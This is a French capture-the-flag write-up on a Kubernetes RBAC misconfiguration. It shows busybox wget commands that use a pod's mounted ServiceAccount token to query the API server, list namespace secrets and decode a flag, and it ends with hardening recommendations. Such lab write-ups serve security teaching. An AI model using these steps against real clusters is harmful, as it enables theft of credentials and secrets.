# Write-up - Say My Name

## Contexte

On se connecte en SSH sur un Pod Kubernetes avec les identifiants `root:password`. Ce write-up s'appuie sur la même méthodologie que le challenge *Fireflow* (voir le write-up HTB) : l'exploitation d'un ServiceAccount Kubernetes mal restreint pour accéder à des ressources sensibles du cluster.

## Énumération

Une fois dans le pod, on récupère les informations classiques exposées à tout ServiceAccount Kubernetes, situées dans `/var/run/secrets/kubernetes.io/serviceaccount/` :

```bash
secure-pod:/var/run/secrets/kubernetes.io/serviceaccount# ls -la
drwxrwxrwt    3 root root  140 Jul  5 10:16 .
drwxr-xr-x    3 root root 4096 Jul  5 10:17 ..
drwxr-xr-x    2 root root  100 ..2026_07_05_10_16_57.3349453986
lrwxrwxrwx    1 root root   32 ..data -> ..2026_07_05_10_16_57.3349453986
lrwxrwxrwx    1 root root   13 ca.crt -> ..data/ca.crt
lrwxrwxrwx    1 root root   16 namespace -> ..data/namespace
lrwxrwxrwx    1 root root   12 token -> ..data/token
```

Ces trois fichiers sont montés automatiquement dans tout pod Kubernetes et permettent de s'authentifier auprès de l'API server :

- `namespace` → `default`
- `token` → un **JWT** signé, utilisé comme Bearer token pour l'API Kubernetes
- `ca.crt` → le certificat de l'autorité de certification du cluster, nécessaire pour valider le TLS de l'API server

On identifie également des informations système annexes :

```bash
secure-pod:/# cat product_name
kind
secure-pod:/# cat product_uuid
7e04344e-930b-4ec8-a559-740f2e7ef9e2
```

(`product_name: kind` confirme qu'il s'agit d'un cluster **KinD** : Kubernetes in Docker.)

## Contrainte technique

Le pod ne dispose ni de `python` ni de `curl`. On s'appuie sur **BusyBox**, disponible avec un support de `wget`, pour interagir directement avec l'API Kubernetes.

## Vérification des permissions du ServiceAccount

Avant d'aller plus loin, on interroge l'API pour connaître nos propres droits, via l'endpoint `SelfSubjectRulesReview` :

```bash
secure-pod:/# busybox wget -q -O - --no-check-certificate --header="Authorization: Bearer $TOKEN" --header="Content-Type: application/json" --post-data='{"kind":"SelfSubjectRulesReview","apiVersion":"authorization.k8s.io/v1","spec":{"namespace":"default"}}' https://kubernetes.default.svc/apis/authorization.k8s.io/v1/selfsubjectrulesreviews
```

La réponse révèle les droits accordés au ServiceAccount `default` dans le namespace `default` :

```json
{
  "status": {
    "resourceRules": [
      {
        "verbs": ["get", "list"],
        "apiGroups": [""],
        "resources": ["secrets"]
      }
    ]
  }
}
```

Le ServiceAccount dispose des verbes **`get` et `list` sur les `secrets`** du namespace `default` : une permission excessive pour un pod applicatif classique, qui constitue la faille exploitable ici.

## Exploitation - Exfiltration des secrets du namespace

On liste l'ensemble des secrets accessibles via l'API :

```bash
secure-pod:/# busybox wget -q -O - --no-check-certificate \
  --header="Authorization: Bearer $TOKEN" \
  https://kubernetes.default.svc/api/v1/namespaces/default/secrets
```

La réponse contient un secret `mysecret` avec un mot de passe encodé en base64 :

```json
{
  "items": [
    {
      "metadata": { "name": "mysecret", "namespace": "default" },
      "data": {
        "password": "U0hMS3tTdXBlclNlY3VyZVNlcnZpY2VBY2NvdW50LTQxZjY0NGRlNmNhNmY5Yzc3NjJ9Cg=="
      },
      "type": "Opaque"
    }
  ]
}
```

## Décodage du flag

```bash
echo "U0hMS3tTdXBlclNlY3VyZVNlcnZpY2VBY2NvdW50LTQxZjY0NGRlNmNhNmY5Yzc3NjJ9Cg==" | base64 -d
```

```
SHLK{SuperSecureServiceAccount-41f644de6ca6f9c7762}
```

## Conclusion

Ce challenge illustre un cas classique de **mauvaise configuration RBAC** dans un cluster Kubernetes : un ServiceAccount monté par défaut dans un pod dispose de droits `get`/`list` sur les `secrets` du namespace, alors qu'un pod applicatif ne devrait généralement avoir accès à aucun secret en dehors des siens, explicitement montés. Un attaquant ayant un accès shell au pod peut utiliser le token JWT du ServiceAccount pour interroger directement l'API server et exfiltrer tous les secrets du namespace, sans avoir besoin d'outils sophistiqués (un simple `wget` via BusyBox suffit).


### Recommandation

- Désactiver le montage automatique du token de ServiceAccount (`automountServiceAccountToken: false`) lorsque non nécessaire.
- Appliquer le principe du moindre privilège dans les `Role`/`RoleBinding` : ne jamais accorder `get`/`list` sur `secrets` à un ServiceAccount applicatif sans besoin explicite.
